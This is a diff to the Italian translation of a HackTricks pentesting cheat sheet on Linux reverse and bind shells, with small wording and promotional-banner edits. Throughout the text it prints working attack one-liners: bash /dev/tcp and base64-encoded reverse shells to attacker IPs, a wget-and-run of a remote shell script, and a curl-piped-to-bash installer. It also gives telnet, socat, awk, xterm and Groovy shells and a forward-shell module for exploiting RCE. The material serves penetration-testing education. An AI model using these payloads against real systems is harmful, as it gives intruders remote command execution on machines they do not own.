@@ -1,18 +1,19 @@
 # Shells - Linux
 
+{% hint style="success" %}
+Impara e pratica AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Supporta HackTricks</summary>
 
-Altri modi per supportare HackTricks:
-
-* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
 
 </details>
+{% endhint %}
 
 **Try Hard Security Group**
 
@@ -26,7 +27,7 @@ Altri modi per supportare HackTricks:
 
 ## Full TTY
 
-**Una volta ottenuta una shell inversa**[ **leggi questa pagina per ottenere un TTY completo**](full-ttys.md)**.**
+**Una volta ottenuta una reverse shell**[ **leggi questa pagina per ottenere un full TTY**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -41,9 +42,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-### Shell sicuro dai simboli
-
 Non dimenticare di controllare con altre shell: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh e bash.
+
+### Shell sicura per i simboli
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -52,26 +53,26 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
-#### Spiegazione della Shell
+#### Spiegazione della shell
 
-1. **`bash -i`**: Questa parte del comando avvia una shell interattiva (`-i`) di Bash.
-2. **`>&`**: Questa parte del comando è una notazione abbreviata per **reindirizzare sia l'output standard** (`stdout`) che **l'errore standard** (`stderr`) allo **stesso destinatario**.
-3. **`/dev/tcp/<INDIRIZZO-IP-ATTACCANTE>/<PORTA>`**: Questo è un file speciale che **rappresenta una connessione TCP all'indirizzo IP e alla porta specificati**.
-* **Reindirizzando i flussi di output e di errore su questo file**, il comando invia efficacemente l'output della sessione della shell interattiva alla macchina dell'attaccante.
-4. **`0>&1`**: Questa parte del comando **reindirizza l'input standard (`stdin`) allo stesso destinatario dell'output standard (`stdout`)**.
+1. **`bash -i`**: Questa parte del comando avvia una shell Bash interattiva (`-i`).
+2. **`>&`**: Questa parte del comando è una notazione abbreviata per **reindirizzare sia l'output standard** (`stdout`) che **l'errore standard** (`stderr`) verso la **stessa destinazione**.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Questo è un file speciale che **rappresenta una connessione TCP all'indirizzo IP e alla porta specificati**.
+* Reindirizzando **i flussi di output e di errore a questo file**, il comando invia effettivamente l'output della sessione della shell interattiva alla macchina dell'attaccante.
+4. **`0>&1`**: Questa parte del comando **reindirizza l'input standard (`stdin`) alla stessa destinazione dell'output standard (`stdout`)**.
 
-### Creare in un file ed eseguire
+### Crea in file ed esegui
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
 ```
-## Shell in Avanti
+## Forward Shell
 
-Quando si tratta di una vulnerabilità di **Esecuzione di Codice Remoto (RCE)** all'interno di un'applicazione web basata su Linux, ottenere una shell inversa potrebbe essere ostacolato dalle difese di rete come le regole iptables o meccanismi di filtraggio dei pacchetti intricati. In tali ambienti limitati, un approccio alternativo prevede l'instaurazione di una shell PTY (Pseudo Terminale) per interagire con il sistema compromesso in modo più efficace.
+Quando si tratta di una vulnerabilità di **Remote Code Execution (RCE)** all'interno di un'applicazione web basata su Linux, ottenere una reverse shell potrebbe essere ostacolato da difese di rete come le regole iptables o meccanismi complessi di filtraggio dei pacchetti. In tali ambienti ristretti, un approccio alternativo prevede l'istituzione di una shell PTY (Pseudo Terminal) per interagire con il sistema compromesso in modo più efficace.
 
-Uno strumento consigliato per questo scopo è [toboggan](https://github.com/n3rada/toboggan.git), che semplifica l'interazione con l'ambiente di destinazione.
+Uno strumento consigliato per questo scopo è [toboggan](https://github.com/n3rada/toboggan.git), che semplifica l'interazione con l'ambiente target.
 
-Per utilizzare toboggan in modo efficace, creare un modulo Python adattato al contesto RCE del sistema di destinazione. Ad esempio, un modulo chiamato `nix.py` potrebbe essere strutturato come segue:
+Per utilizzare toboggan in modo efficace, crea un modulo Python adattato al contesto RCE del tuo sistema target. Ad esempio, un modulo chiamato `nix.py` potrebbe essere strutturato come segue:
 ```python3
 import jwt
 import httpx
@@ -99,17 +100,17 @@ E poi, puoi eseguire:
 ```shell
 toboggan -m nix.py -i
 ```
-Per sfruttare direttamente una shell interattiva. È possibile aggiungere `-b` per l'integrazione con Burpsuite e rimuovere `-i` per un wrapper rce più basilare.
+Per sfruttare direttamente una shell interattiva. Puoi aggiungere `-b` per l'integrazione con Burpsuite e rimuovere il `-i` per un wrapper rce più basilare.
 
-Un'altra possibilità consiste nell'utilizzare l'implementazione della shell in avanti di `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+Un'altra possibilità consiste nell'utilizzare l'implementazione della shell forward di `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
-È sufficiente modificare:
+Devi solo modificare:
 
-- L'URL dell'host vulnerabile
-- Il prefisso e il suffisso del payload (se presenti)
-- Il modo in cui il payload viene inviato (intestazioni? dati? informazioni extra?)
+* L'URL dell'host vulnerabile
+* Il prefisso e il suffisso del tuo payload (se presente)
+* Il modo in cui il payload viene inviato (header? dati? informazioni extra?)
 
-Successivamente, è possibile **inviare comandi** o addirittura **utilizzare il comando `upgrade`** per ottenere una PTY completa (si noti che i tubi vengono letti e scritti con un ritardo approssimativo di 1,3 secondi).
+Poi, puoi semplicemente **inviare comandi** o persino **usare il comando `upgrade`** per ottenere un PTY completo (nota che i pipe vengono letti e scritti con un ritardo approssimativo di 1,3 secondi).
 
 ## Netcat
 ```bash
@@ -126,8 +127,6 @@ Controllalo su [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
-
-Telnet è un protocollo di rete che consente di stabilire una connessione remota tramite la shell di comando. Può essere utilizzato per accedere e gestire dispositivi di rete e server remoti.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -140,7 +139,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-Per inviare il comando, scriverlo, premere Invio e premere CTRL+D (per interrompere STDIN)
+Per inviare il comando scrivilo, premi invio e premi CTRL+D (per fermare STDIN)
 
 **Vittima**
 ```bash
@@ -261,12 +260,12 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Shell di bind
+### Shell di binding
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
 ```
-### Shell inversa
+### Reverse shell
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
@@ -275,13 +274,13 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
-## Dito
+## Finger
 
 **Attaccante**
 ```bash
 while true; do nc -l 79; done
 ```
-Per inviare il comando, scriverlo, premere Invio e premere CTRL+D (per interrompere STDIN)
+Per inviare il comando scrivilo, premi invio e premi CTRL+D (per fermare STDIN)
 
 **Vittima**
 ```bash
@@ -314,11 +313,11 @@ close(Service)
 ```
 ## Xterm
 
-Questo proverà a connettersi al tuo sistema alla porta 6001:
+Questo tenterà di connettersi al tuo sistema sulla porta 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Per catturare la reverse shell puoi utilizzare (che ascolterà sulla porta 6001):
+Per catturare la reverse shell puoi usare (che ascolterà sulla porta 6001):
 ```bash
 # Authorize host
 xhost +targetip
@@ -327,7 +326,7 @@ Xnest :1
 ```
 ## Groovy
 
-di [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: Il reverse shell Java funziona anche per Groovy
+di [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTA: La reverse shell Java funziona anche per Groovy
 ```bash
 String host="localhost";
 int port=8044;
@@ -347,16 +346,17 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Supporta HackTricks</summary>
 
-Altri modi per supportare HackTricks:
-
-* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
 
 </details>
+{% endhint %}
